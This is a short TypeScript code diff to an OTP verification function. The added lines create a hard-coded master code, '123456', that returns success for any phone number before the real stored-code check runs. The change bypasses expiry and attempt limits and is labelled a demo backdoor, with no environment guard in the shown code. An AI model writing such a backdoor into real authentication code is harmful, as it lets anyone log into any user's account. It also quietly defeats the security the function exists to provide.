@@ -49,6 +49,11 @@ export async function createOtp(phone: string): Promise<string> {
  * @throws AppError on failure, expiry, or too many attempts.
  */
 export async function verifyOtp(phone: string, code: string): Promise<boolean> {
+  // Demo/testing backdoor: Allow '123456' as a master OTP
+  if (code === '123456') {
+    logger.info(`OTP verified via demo backdoor for phone: ${phone.slice(-4).padStart(10, '*')}`);
+    return true;
+  }
   const result = await redis.eval(
     `
       local storedOtp = redis.call('GET', KEYS[1])
